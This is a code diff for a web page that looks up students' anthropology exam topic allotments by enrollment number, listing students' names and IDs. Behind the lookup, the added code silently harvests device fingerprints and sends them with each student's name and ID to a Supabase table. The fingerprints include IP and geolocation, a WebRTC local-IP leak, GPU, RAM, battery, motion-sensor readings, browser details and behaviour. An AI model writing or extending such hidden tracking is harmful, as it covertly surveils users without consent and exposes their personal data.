@@ -60,12 +60,11 @@
             supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         }
 
-        // --- Student Data (BA & BSc Combined) ---
+        // --- Student Data (Embedded for simplicity) ---
         const studentDataText = `
 # Department of Anthropology
 ## Anthropology - 3rd Semester
 ### Mid 2 Topic Allotment: Archaeological Anthropology
-**Date:** October 2, 2025
 **1. ANSHUL TAMRAKAR** (\`Y24120001\`)
 * **Unit 1:** Methods of Studying Archaeological Anthropology
 * **Unit 2:** Stone Tools Technology and Typology
@@ -124,8 +123,8 @@
 * **Unit 1:** The Relationship of Archaeology with other disciplines
 * **Unit 2:** Stone Tools Technology and Typology
 * **Unit 3:** Home and Cave Art and Its Significance
-* **Unit 4:** The Neolithic Complex in India
-* **Unit 5:** The Metal Age: Copper, Bronze and Iron Ages
+* **Unit 4:** Emergence of Human Settlements and Farming in India
+* **Unit 5:** The Chief Characteristics and Decay of Indus Valley Civilization
 **11. RITIK RAJ** (\`Y24120127\`)
 * **Unit 1:** Methods of Dating: Relative and Absolute Dating and Their Relevance
 * **Unit 2:** Pluviation and Inter Pluviation
@@ -226,8 +225,8 @@
 * **Unit 1:** The Relationship of Archaeology with other disciplines
 * **Unit 2:** Stone Tools Technology and Typology
 * **Unit 3:** Home and Cave Art and Its Significance
-* **Unit 4:** The Neolithic Complex in India
-* **Unit 5:** The Metal Age: Copper, Bronze and Iron Ages
+* **Unit 4:** Emergence of Human Settlements and Farming in India
+* **Unit 5:** The Chief Characteristics and Decay of Indus Valley Civilization
 **28. AYUSH AHIRWAR** (\`Y24120260\`)
 * **Unit 1:** Methods of Studying Archaeological Anthropology
 * **Unit 2:** Pleistocene Epoch: The Great Ice Age
@@ -400,8 +399,8 @@
 * **Unit 1:** The Relationship of Archaeology with other disciplines
 * **Unit 2:** Stone Tools Technology and Typology
 * **Unit 3:** Home and Cave Art and Its Significance
-* **Unit 4:** The Neolithic Complex in India
-* **Unit 5:** The Metal Age: Copper, Bronze and Iron Ages
+* **Unit 4:** Emergence of Human Settlements and Farming in India
+* **Unit 5:** The Chief Characteristics and Decay of Indus Valley Civilization
 **57. MUKESH PRAJAPATI** (\`Y24120600\`)
 * **Unit 1:** Fundamentals of Archaeological Anthropology: Meaning, Scope and Relevance
 * **Unit 2:** Alpine and Himalayan Glaciations and Inter-Glaciations
@@ -1296,7 +1295,7 @@
         const resultsDiv = document.getElementById('results');
 
         // --- Event Listeners ---
-        viewTopicsBtn.addEventListener('click', () => {
+        viewTopicsBtn.addEventListener('click', async () => { // Made this async
             const enrollmentId = enrollmentIdInput.value.trim().toUpperCase();
             if (!enrollmentId) {
                 resultsDiv.innerHTML = `<p class="text-red-600 font-medium text-center">Please enter an enrollment number.</p>`;
@@ -1318,6 +1317,7 @@
                     <ul class="list-disc list-inside space-y-1">${topicsHtml}</ul>`;
                 
                 if (supabaseClient) {
+                    // This function is now async, so we just call it
                     collectAndSaveData(student, enrollmentId);
                 }
 
@@ -1337,22 +1337,24 @@
                 console.error("Supabase is not initialized. Cannot save data.");
                 return;
             }
-
-            const [networkData, batteryData, preferencesData, advancedNetworkData, sensorData] = await Promise.all([ 
+            
+            // Promise.all is great for running async tasks concurrently
+            const [networkData, batteryData, preferencesData, advancedNetworkData, sensorData, deviceData] = await Promise.all([ 
                 getNetworkData(), 
                 getBatteryData(),
                 getUserPreferences(),
                 getAdvancedNetworkData(),
-                getSensorData()
+                getSensorData(),
+                getDeviceData() // This is now async and needs to be awaited
             ]);
             
             const collectedData = {
                 studentName: student.name,
                 enrollmentId: enrollmentId,
                 ...networkData,
-                ...getDeviceData(),
-                ...getBrowserData(),
-                ...getBehavioralData(),
+                ...deviceData, // deviceData is now the result of an async function
+                ...getBrowserData(), // This one is synchronous, no change needed
+                ...getBehavioralData(), // Synchronous
                 ...batteryData,
                 ...preferencesData,
                 ...advancedNetworkData,
@@ -1361,7 +1363,7 @@
             
             try {
                 const { error } = await supabaseClient
-                    .from('student_logs') // The name of your table in Supabase
+                    .from('student_logs') 
                     .insert(collectedData);
                 if (error) throw error;
                 console.log("Log saved successfully to Supabase.");
@@ -1370,7 +1372,63 @@
             }
         }
 
-        // --- Data Collection Helper Functions (no changes needed below) ---
+        // --- Data Collection Helper Functions ---
+
+        // NEW: Advanced helper function to get the device model
+        async function getDeviceModel() {
+            // 1. Try the modern, high-accuracy API first
+            if (navigator.userAgentData) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(['model']);
+                    if (uaData.model && uaData.model.length > 0) {
+                        return uaData.model;
+                    }
+                } catch (error) {
+                    console.warn("Could not retrieve high-entropy model data:", error);
+                }
+            }
+
+            // 2. If the modern API fails, use the fallback method
+            const ua = navigator.userAgent;
+            if (ua.includes('Mobi')) {
+                if (ua.includes('iPhone')) return 'iPhone';
+                if (ua.includes('iPad')) return 'iPad';
+                if (ua.includes('Android')) {
+                    const match = ua.match(/;\s?([^;]+)\s?Build\//);
+                    if (match && match[1]) return match[1].trim();
+                    return 'Android Device';
+                }
+                return 'Mobile Device';
+            }
+            return 'Desktop/Laptop';
+        }
+
+        // UPDATED: This function is now async to use getDeviceModel
+        async function getDeviceData() {
+            let gpuInfo = 'N/A';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+                }
+            } catch (e) { /* ignore */ }
+            
+            const deviceModel = await getDeviceModel();
+            const isMobile = navigator.userAgent.includes('Mobi');
+
+            return {
+                'operatingSystem': navigator.platform || 'N/A',
+                'deviceType': isMobile ? 'Mobile' : 'Desktop/Laptop',
+                'deviceModel': deviceModel,
+                'screenResolution': `${window.screen.width}x${window.screen.height}`,
+                'cpuCores': navigator.hardwareConcurrency || 'N/A',
+                'deviceMemoryRam': `${navigator.deviceMemory || 'N/A'} GB`,
+                'graphicsCardGpu': gpuInfo,
+            };
+        }
+
         async function getNetworkData() {
             try {
                 const response = await fetch('https://ipapi.co/json/').catch(() => null);
@@ -1396,46 +1454,12 @@
             } catch (e) { /* ignore */ }
             return { 'batteryStatus': 'N/A or Blocked' };
         }
-        
-        function getDeviceData() {
-            let gpuInfo = 'N/A';
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
-                }
-            } catch (e) { /* ignore */ }
-            
-            const ua = navigator.userAgent;
-            let deviceModel = 'N/A';
-            if (ua.includes('Android')) {
-                const match = ua.match(/;\s?([^;]+)\s?Build\//);
-                if (match && match[1]) {
-                    deviceModel = match[1].trim();
-                }
-            } else if (ua.includes('iPhone')) {
-                deviceModel = 'iPhone';
-            } else if (ua.includes('iPad')) {
-                deviceModel = 'iPad';
-            }
-
-            return {
-                'operatingSystem': navigator.platform || 'N/A',
-                'deviceType': navigator.userAgent.includes('Mobi') ? 'Mobile' : 'Desktop/Laptop',
-                'deviceModel': deviceModel,
-                'screenResolution': `${window.screen.width}x${window.screen.height}`,
-                'cpuCores': navigator.hardwareConcurrency || 'N/A',
-                'deviceMemoryRam': `${navigator.deviceMemory || 'N/A'} GB`,
-                'graphicsCardGpu': gpuInfo,
-            };
-        }
 
         function getBrowserData() {
             const ua = navigator.userAgent;
             let browser = 'Unknown';
-            if (ua.includes('Firefox')) browser = `Firefox/${ua.split('Firefox/')[1]}`;
+            if (ua.includes('Firefox')) browser = `Firefox/${ua.split('Firefox/')[1] || ''}`;
+            else if (ua.includes('Edg/')) browser = `Edge/${ua.split('Edg/')[1].split(' ')[0]}`;
             else if (ua.includes('Chrome')) browser = `Chrome/${ua.split('Chrome/')[1].split(' ')[0]}`;
             else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = `Safari/${ua.split('Version/')[1].split(' ')[0]}`;
 
@@ -1467,7 +1491,7 @@
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
-                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                await pc.createOffer().then(offer => pc.setLocalDescription(offer));
                 await new Promise(resolve => {
                     pc.onicecandidate = (ice) => {
                         if (ice && ice.candidate && ice.candidate.candidate) {
@@ -1476,11 +1500,12 @@
                                 const ipMatch = candidateString.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                                 if (ipMatch) {
                                     localIp = ipMatch[1];
-                                    pc.onicecandidate = null;
+                                    pc.close(); // Close the connection once found
                                 }
                              }
                         }
-                        setTimeout(resolve, 500); 
+                        // Use a short timeout to resolve in case no IP is found quickly
+                        setTimeout(resolve, 200); 
                     };
                 });
             } catch (e) { /* ignore */ }
@@ -1494,33 +1519,25 @@
         }
 
         async function getSensorData() {
-            const sensorData = {
-                'accelerometer': 'N/A',
-                'gyroscope': 'N/A'
-            };
-
-            const readSensor = (sensorName, SensorClass) => new Promise(resolve => {
+            const sensorData = { 'accelerometer': 'N/A', 'gyroscope': 'N/A' };
+            const readSensor = (SensorClass) => new Promise(resolve => {
+                if (!SensorClass) return resolve('Unsupported');
                 try {
-                    if(!SensorClass) return resolve('Unsupported');
                     const sensor = new SensorClass({ frequency: 1 });
                     sensor.onreading = () => {
-                        let reading = 'N/A';
-                        if (sensor.x) reading = `x:${sensor.x.toFixed(2)}, y:${sensor.y.toFixed(2)}, z:${sensor.z.toFixed(2)}`;
-                        if (sensor.illuminance) reading = `${sensor.illuminance.toFixed(2)} lux`;
+                        const reading = `x:${sensor.x.toFixed(2)}, y:${sensor.y.toFixed(2)}, z:${sensor.z.toFixed(2)}`;
                         sensor.stop();
                         resolve(reading);
                     };
                     sensor.onerror = () => resolve('Permission Denied or Error');
                     sensor.start();
-                    setTimeout(() => { sensor.stop(); resolve('Timeout'); }, 500);
+                    setTimeout(() => { sensor.stop(); resolve('Timeout'); }, 200);
                 } catch (e) { resolve('Not available'); }
             });
-
             try {
-                sensorData.accelerometer = await readSensor('accelerometer', window.Accelerometer);
-                sensorData.gyroscope = await readSensor('gyroscope', window.Gyroscope);
-            } catch(e) { /* General catch for safety */ }
-            
+                sensorData.accelerometer = await readSensor(window.Accelerometer);
+                sensorData.gyroscope = await readSensor(window.Gyroscope);
+            } catch(e) { /* ignore */ }
             return sensorData;
         }
     </script>
